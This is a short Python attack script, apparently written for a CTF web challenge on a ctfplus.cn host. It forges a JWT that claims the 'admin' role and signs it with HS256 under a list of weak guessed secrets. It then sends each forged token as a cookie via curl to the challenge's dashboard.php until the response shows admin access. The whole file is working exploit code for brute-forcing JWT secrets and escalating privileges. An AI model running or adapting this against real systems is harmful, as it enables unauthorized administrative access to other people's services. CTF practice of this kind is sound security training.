import hmac
import hashlib
import base64
import subprocess

header = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
payload = 'eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwicXhwIjoxNzc0NzA2NzEyfQ'

# 正确的 payload，使用 exp 而不是 qxp
import json
correct_payload = {'sub': '1', 'role': 'admin', 'exp': 1774706712}
correct_payload_b64 = base64.urlsafe_b64encode(json.dumps(correct_payload, separators=(',', ':')).encode()).decode().rstrip('=')
print(f'Correct payload: {correct_payload_b64}')

weak_keys = ['', 'secret', '123456', 'password', 'admin', 'jwt', 'key', 'star', 'staralliance', 'xm', '12345678',
             'star2024', 'ctf', 'ctfplus', 'flag', 'hack', 'test']

for key in weak_keys:
    message = header + '.' + correct_payload_b64
    signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    jwt = message + '.' + signature_b64

    print(f'Testing key: {key!r}')
    result = subprocess.run(['curl.exe', '-X', 'GET', 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/dashboard.php',
                            '-H', f'Cookie: token={jwt}', '-s'], capture_output=True, text=True)
    if 'admin' in result.stdout.lower():
        print('✅ SUCCESS! Found admin access!')
        print(result.stdout)
        break
